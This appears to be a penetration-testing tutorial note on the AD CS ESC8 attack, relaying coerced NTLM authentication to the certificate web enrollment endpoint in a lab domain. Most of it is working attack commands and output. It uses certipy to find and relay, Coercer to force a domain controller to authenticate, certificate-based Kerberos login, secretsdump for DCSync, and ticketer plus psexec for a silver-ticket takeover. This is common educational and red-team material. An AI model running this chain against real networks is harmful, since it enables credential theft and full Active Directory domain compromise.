This ADCS misconfiguration that can be abused using `NTLM Relay`. The whole story turns around **HTTP-based enrollment** feature of the ADCS which allows a certificate enrollment via HTTP method. 
The `HTTP` protocol does not verify the `NTLM signature` during authentication. Therefore, if the HTTP enrollment endpoint is enabled, we can obtain NTLM authentication (via authentication coercion or poisoning), relay it to the PKI server's HTTP endpoint, and request a certificate for the authenticated account.


## Requisites
 In brief, `ESC8` is "`NTLM Relay to ADCS HTTP Endpoints`". The idea behind the `ESC8` abuse is to coerce authentication from a machine account and relay it to `AD CS` to obtain a certificate that allows for client authentication; afterward, we abuse the certificate to forge a Silver Ticket. Therefore, if the `AD CS` is vulnerable to `ESC8`, we can compromise any computer in the domain from which we can coerce authentication.
 
 - A vulnerable web enrollment endpoint.
- At least one certificate template enabled allows domain computer enrollment and client authentication (like the default Machine/Computer template).

## Enumeration
To identify potential Templates that can be used to carry an ESC8 type attack we can do:
**Linux:**
```
certipy-ad find -u blwasp -p 'Password123!' -dc-ip 172.16.19.3 -vulnerable -stdout

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'lab-WS01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'lab-WS01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'lab-WS01-CA' via RRP
[*] Got CA configuration for 'lab-WS01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : lab-WS01-CA
    DNS Name                            : WS01.lab.local
    Certificate Subject                 : CN=lab-WS01-CA, DC=lab, DC=local
    Certificate Serial Number           : 238F549429FFF796430B5F486159490B
    Certificate Validity Start          : 2023-07-06 09:44:47+00:00
    Certificate Validity End            : 2122-07-06 09:54:47+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled
    Permissions
      Owner                             : LAB.LOCAL\Administrators
      Access Rights
        ManageCertificates              : LAB.LOCAL\Administrators
                                          LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        ManageCa                        : LAB.LOCAL\Administrators
                                          LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Enroll                          : LAB.LOCAL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
Certificate Templates                   : [!] Could not find any certificate templates
```
What we are looking for here is the **Web Enrollment** service enabled.


# Attacks
If we identified that the CA is vulnerable to attack type ESC8 and the *Web Enrollment* is available then we can follow the following steps to a machine takeover.
<font color="#ff0000">OBS: Although in this section we will be focusing on attacking domain machines, in the same way, that we can use NTLM Relay to compromise a machine, we can also use it to compromise users.</font>

## Scenario 1(DCSync)
We need a computer in the domain, other than the CA itself, to authenticate against our machine to carry out this attack. To achieve this, we will use authentication coercion.
![[Pasted image 20240824222651.png]]
- We use *Certipy* to listen or wait for authentication via NTLM and then add two arguments: the target `172.16.19.5` will be the CA or ADCS server, and then we add the template, which must correspond to the machine we are attacking(where `Machine template=client authentication over Domain Computer` and `DomainController template=if the coerced authentication originates from a domain controller`.)
```
sudo certipy-ad relay -target 172.16.19.5 -template DomainController

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting http://172.16.19.5/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
```
- Next we need to execute the coercion attack where the **-l=listener address(our Linux machine where Relay is listening)  & -t=Domain Controller(it is the initiator TARGET)**
```
coercer coerce -l 172.16.19.19 -t 172.16.19.3 -u blwasp -p 'Password123!' -d lab.local -v
       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4.3
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

[info] Starting coerce mode
[info] Scanning target 172.16.19.3
[*] DCERPC portmapper discovered ports: 49664,49665,49666,49667,49696,49699,49673,49745,49714,49693
[+] Coercing '172.16.19.3' to authenticate to '172.16.19.19'
[+] DCERPC port '49696' is accessible!
   [+] Successful bind to interface (12345678-1234-ABCD-EF00-0123456789AB, 1.0)!
      [!] (NO_AUTH_RECEIVED) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotification(pszLocalMachine='\\172.16.19.19\x00') 
Continue (C) | Skip this function (S) | Stop exploitation (X) ? c
      [>] (-testing-) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotificationEx(pszLocalMachine='\\172.16.19.19\x00')
```
- After a while we should be able to fetch a certificate as the DC.
```
sudo certipy-ad relay -target 172.16.19.5 -template DomainController

[*] Requesting certificate for 'DC\\LAB-DC$' based on the template 'DomainController'
[*] Got certificate with DNS Host Name 'lab-dc.lab.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'lab-dc.pfx'
[*] Exiting...
```
- We can use that to get a valid TGT kerberos ticket as the DC$ object.
```
certipy-ad auth -pfx lab-dc.pfx
```
- With this ticket we can perform a *DCSync* attack and a DC takeover.
```
export KRB5CCNAME=lab-dc.ccache
impacket-secretsdump -k -no-pass 
```

## Scenario 2(Silver ticket)
We will see another possible scenario where the PE is in forging a Silver ticket for the domain takeover.
- We start by querying the DC with his NTLM hash(obtained before via *NTLM relay Coercion*) to get the **DomainSID**
```
impacket-lookupsid 'lab-dc$'@172.16.19.3 -hashes :92bd84175886a57ab41a14731d10428a
```
- Next we can forge a **SilverTicket** with the *DomainSID* value and the *NTLM* of the DC$
```
impacket-ticketer.py -nthash 92bd84175886a57ab41a14731d10428a -domain-sid S-1-5-21-1817219280-1014233819-995920665 -domain lab.local -spn cifs/lab-dc.lab.local Administrator
```
- Lastly a *PassTheTicket* attack to gain access to the DC.
```
 export KRB5CCNAME=Administrator.ccache
 impacket-psexec -k -no-pass lab-dc.lab.local
```


## Conops
`Authentication coercion` attacks initiate an operation that forces the client to authenticate against us even if they do not intend to initiate authentication. These attacks usually rely on insecure code in some protocols used by sensitive servers. As mentioned by [@podalirius_](https://twitter.com/podalirius_) "The root cause of this vulnerability/feature in each of these methods is that Windows machines automatically authenticate to other machines when trying to access UNC paths like `\\172.16.117.30\file.txt`."